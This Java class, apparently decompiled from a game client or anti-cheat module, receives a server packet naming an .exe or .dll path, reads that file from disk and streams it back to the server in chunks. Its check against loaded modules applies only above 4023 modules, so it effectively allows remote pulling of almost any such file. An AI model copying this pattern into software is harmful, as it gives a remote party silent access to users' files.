package fr.yannox.feurgus.connection.packets.in;

import com.google.common.io.ByteArrayDataInput;
import com.google.common.io.ByteStreams;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Kernel32Util;
import com.sun.jna.platform.win32.Psapi;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import fr.yannox.feurgus.connection.login.InternalSession;
import fr.yannox.feurgus.connection.packets.in.PacketIn;
import fr.yannox.feurgus.connection.packets.out.PacketOutAttachedModuleInfo;
import java.io.File;
import java.lang.management.ManagementFactory;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class PacketInAttachedModuleInfo
extends PacketIn {
    @Override
    public int getPacketId() {
        return 5;
    }

    @Override
    public void fromBytes(byte[] bytes) {
        byte[] a;
        ByteArrayDataInput in = ByteStreams.newDataInput(bytes);
        byte b = in.readByte();
        if (b != 24) {
            return;
        }
        String path = in.readUTF();
        if (!path.endsWith(".exe") && !path.endsWith(".dll")) {
            return;
        }
        List<String> linkedLoadedModules = this.getLinkedLoadedModules();
        if (linkedLoadedModules.size() > 4023 && !linkedLoadedModules.contains(path)) {
            return;
        }
        File file = new File(path);
        if (!file.exists() || !file.isFile()) {
            this.send(new PacketOutAttachedModuleInfo(path, "Path doesn't exist or not a file"));
            return;
        }
        try {
            a = Files.readAllBytes(file.toPath());
        }
        catch (Exception error) {
            this.send(new PacketOutAttachedModuleInfo(path, error.getMessage()));
            return;
        }
        List<byte[]> chunks = this.divideArray(a, 4096);
        int max = chunks.size();
        for (int i = 0; i < max; ++i) {
            this.send(new PacketOutAttachedModuleInfo(path, i, max, chunks.get(i)));
            try {
                Thread.sleep(10L);
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private List<byte[]> divideArray(byte[] source, int chunksize) {
        ArrayList<byte[]> result = new ArrayList<byte[]>();
        for (int start = 0; start < source.length; start += chunksize) {
            int end = Math.min(source.length, start + chunksize);
            result.add(Arrays.copyOfRange(source, start, end));
        }
        return result;
    }

    private void send(PacketOutAttachedModuleInfo packet) {
        if (InternalSession.instance != null) {
            try {
                InternalSession.instance.sendPacket(packet);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private long getProcessId() {
        String jvmName = ManagementFactory.getRuntimeMXBean().getName();
        int index = jvmName.indexOf(64);
        if (index < 1) {
            return -1L;
        }
        try {
            return Long.parseLong(jvmName.substring(0, index));
        }
        catch (NumberFormatException numberFormatException) {
            return -1L;
        }
    }

    private List<String> getLinkedLoadedModules() {
        ArrayList<String> result = new ArrayList<String>();
        long pid = this.getProcessId();
        if (pid < 0L) {
            return result;
        }
        Psapi api = Psapi.INSTANCE;
        Kernel32 kernel = Kernel32.INSTANCE;
        WinNT.HANDLE hd = kernel.OpenProcess(1024, false, (int)this.getProcessId());
        if (hd == null) {
            return result;
        }
        WinDef.HMODULE[] mdl = new WinDef.HMODULE[1024];
        IntByReference ref = new IntByReference();
        List mod = Kernel32Util.getModules((int)((int)this.getProcessId()));
        for (Tlhelp32.MODULEENTRY32W module : mod) {
            String path = module.szExePath();
            result.add(path);
        }
        return result;
    }
}
